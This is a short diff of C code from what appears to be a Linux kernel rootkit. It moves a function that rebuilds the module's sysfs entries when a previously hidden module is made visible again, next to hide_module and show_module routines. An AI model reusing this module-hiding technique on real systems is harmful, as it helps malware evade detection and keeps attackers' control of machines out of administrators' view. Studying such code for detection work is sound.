@@ -276,7 +276,11 @@ void hide_module(void){
 }
 void populate_sysfs(void){
 	int i;
-
+	THIS_MODULE->holders_dir=kobject_create_and_add("holders", &THIS_MODULE->mkobj.kobj);
+	for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL; i++){
+		if(sysfs_create_file(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->modinfo_attrs[i].attr)!=0)
+		break;
+	}
 }
 void show_module(void){
 	if(mod_hidden == 1){
@@ -284,14 +288,6 @@ void show_module(void){
 		kobject_add(&THIS_MODULE->mkobj.kobj, NULL, "%s", THIS_MODULE->name);
 		populate_sysfs();
 		mod_hidden = 0;
-	}
-}
-static void populate_sysfs(void){
-	int i;
-	THIS_MODULE->holders_dir=kobject_create_and_add("holders", &THIS_MODULE->mkobj.kobj);
-	for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL; i++){
-		if(sysfs_create_file(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->modinfo_attrs[i].attr)!=0)
-			break;
 	}
 }
 
